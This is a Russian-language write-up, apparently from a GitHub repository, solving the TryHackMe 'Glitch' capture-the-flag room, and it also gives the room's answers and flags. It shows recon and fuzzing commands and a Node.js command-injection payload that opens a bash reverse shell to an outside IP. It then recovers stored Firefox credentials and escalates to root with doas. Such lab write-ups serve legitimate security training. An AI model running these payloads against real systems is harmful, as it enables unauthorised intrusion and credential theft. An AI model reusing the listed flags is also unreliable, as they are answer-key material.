[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [GLITCH](https://tryhackme.com/r/room/glitch) 

Всего 1 заданиe:
## Задание 1
Внимание! Коробка содержит  мигающие изображения и деликатные слова.

Это простая задача, в которой вам нужно эксплуатировать уязвимое веб-приложение и получить root-доступ к машине. Она ориентирована на новичков, некоторые базовые знания JavaScript будут полезны, но не обязательны. Отзывы всегда приветствуются.

*Примечание: для фактического запуска веб-сервера может потребоваться несколько минут.

### Ответьте на вопросы ниже
Разверните машину.
```commandline
Ответ не нужен
```
Какой у вас токен доступа?
```commandline
nmap -sC -sV <IP>
curl -s http://<IP>/api/access
echo "dGhpc19pc19ub3RfcmVhbA==" | base64 -d
```
```commandline
this_is_not_real
```
Каково содержимое файла user.txt?
```commandline
gobuster dir -u http://<IP>/api/ -x php,txt,bak,old,tar,zip -w /usr/share/wordlists/dirb/common.txt 
curl http://<IP>/api/items
curl -XPOST http://<IP>/api/items
wfuzz -X POST -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt --hh=45 http://<IP>/api/items?FUZZ=oops
curl -X POST http://<IP>/api/items?cmd=id
curl -X POST "http://<IP>/api/items?cmd=process.cwd()"
curl -X POST "http://<IP>/api/items?cmd=require("child_process").exec('bash+-c+"bash+-i+>%26+/dev/tcp/10.8.50.72/4444+0>%261"')
nc -nlvp 4444
cat /home/user/user.txt
```
```commandline
THM{i_don't_know_why}
```
Каково содержимое файла root.txt?
```commandline
# https://github.com/unode/firefox_decrypt
python3 firefox_decrypt.py /data/GLITCH/files/.firefox/
Username: 'v0id'
Password: 'love_the_void'
sudo -l
find / -type f -user root -perm -u=s 2>/dev/null
doas -u root /bin/bash
cat /root/root.txt
```
```commandline
THM{diamonds_break_our_aching_minds}
```


[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)